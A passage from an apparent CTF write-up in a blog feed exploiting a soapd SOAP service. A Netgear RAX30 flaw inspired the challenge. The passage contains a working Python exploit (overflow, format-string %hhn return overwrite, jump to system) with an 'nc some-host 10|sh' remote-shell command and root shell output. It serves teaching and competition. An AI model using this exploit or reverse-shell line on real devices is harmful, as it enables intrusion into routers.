style="color:rgb(248, 248, 242)">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">4096</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">split</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">b'request&lt;/H4&gt;\n'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">split</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">b'ENDEND'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">b'\0'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">text_leak </span><span class="token operator">=</span><span class="token plain"> u32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">leak</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">stack_leak </span><span class="token operator">=</span><span class="token plain"> u32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">leak</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">close</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Looking closer at the string functions being used, there are several buffer overflows from calls to <code>sprintf</code> and <code>strcpy</code>. However almost all of these are protected by stack-cookies. Luckily there is a single case where a pointer lays between a buffer and the stack-cookie:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">__int64 __cdecl </span><span class="token function" style="color:rgb(80, 250, 123)">soap_response</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> dest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">2048</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> src</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">2048</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token operator">*</span><span class="token plain"> format_str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> cookie</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  format_str </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"%s"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">sprintf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">src</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">off</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"%s"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> sub_action</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">sprintf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token plain">src</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">off</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> format_str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> action</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Since we are able to buffer overflow <code>src</code> using the first <code>sprintf</code> call, we can smash the <code>format_str</code> ptr. This allows point <code>format_str</code> at our own data on the stack (using the leak from earlier), giving us an arbitrary <a href="https://en.wikipedia.org/wiki/Uncontrolled_format_string" target="_blank" rel="noopener noreferrer">format string vulnerability</a>.</p>
<p>We can easily exploit the format string by using the <code>%123$hhn</code> syntax. This syntax will write the number of bytes printed so far as a <code>uint8_t</code> at a given offset on the stack. This is very handy as we can use it to surgically corrupt a return pointer without messing with the stack-cookie.</p>
<p>At this point we can control the EIP register, but we still need to actually get code execution. There is an easy way to do this by abusing the calls to <code>system</code> in the binary. We can partially corrupt the return address to point it to the following address in the binary:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">.text:00001A76                 call    system</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.text:00001A7B                 add     esp, 10h</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.text:00001A7E                 sub     esp, 8</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The first argument of system will be the next value pointed to by ESP, which just so happens to be our format string from before. We can simply prepend our format string exploit with a command to run!</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Prep return byte overwrite targets</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">g1 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0x76</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">g2 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">text_leak </span><span class="token operator">&amp;</span><span class="token plain"> </span><span class="token number">0xf000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;&gt;</span><span class="token plain"> </span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">0xa</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sock </span><span class="token operator">=</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">HOST</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> PORT</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'post / a\nSOAPAction: '</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'numberwang#wangernum42'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Place write targets on the stack</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">target_stack_ret</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">target_stack_ret</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Padding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'EEEE'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'FFFF'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'A'</span><span class="token operator">*</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">1824</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Smash format ptr</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">stack_leak</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\n\n'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Command to run in system</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fmt </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'nc some-host 10|sh;#'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Format string exploit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fmt </span><span class="token operator">+=</span><span class="token plain">  </span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'%</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">g1</span><span class="token string-interpolation interpolation operator">-</span><span class="token string-interpolation interpolation builtin" style="color:rgb(189, 147, 249)">len</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation interpolation">fmt</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">c'</span><span class="token operator">+</span><span class="token string" style="color:rgb(255, 121, 198)">'%592$hhn'</span><span class="token operator">+</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'%</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">g2</span><span class="token string-interpolation interpolation operator">-</span><span class="token string-interpolation interpolation">g1</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">c'</span><span class="token operator">+</span><span class="token string" style="color:rgb(255, 121, 198)">'%593$hhn'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pl </span><span class="token operator">+=</span><span class="token plain"> fmt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'latin-1'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sendall</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pl</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>With this exploit ready to go, we can run it from the second target box. Once the exploit lands we are greeted with our last reverse shell and get the last flag!</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ nc -l 1339 -v</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Listening on 0.0.0.0 1339</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection received on 192.168.1.2 14253</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: cannot set terminal process group (8): Inappropriate ioctl for device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: no job control in this shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@21fbbf871fa0:/# cat flag3.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">turtles{c14583540ce6a34f73cb04d964aff18415916fae}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@21fbbf871fa0:/#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="editors-note-1">Editor's note:<a href="https://www.supernetworks.org/pages/blog/january-2023-turtles#editors-note-1" class="hash-link" aria-label="Direct link to Editor's note:" title="Direct link to Editor's note:">​</a></h4>
<p>Challenge 3 is based on a flaw the Supernetworks team exploited in preparation for December's pwn2own contest against the Netgear RAX30. Oddly enough: the soapd binary has FORTIFY_SOURCE enabled, yet still has some stray sprintfs, and does in fact store the format string on the stack like that, for unclear reasons.</p>]]></content>
        <author>
            <name>Amy</name>
            <uri>https://twitter.com/itszn13</uri>
        </author>
        <category label="Turtles" term="Turtles"/>
        <category label="CTF" term="CTF"/>
        <category label="Hacking" term="Hacking"/>
        <category label="WiFi" term="WiFi"/>
        <category label="EvilTwin" term="EvilTwin"/>
        <category label="Deauthentication" term="Deauthentication"/>
    </entry>
</feed>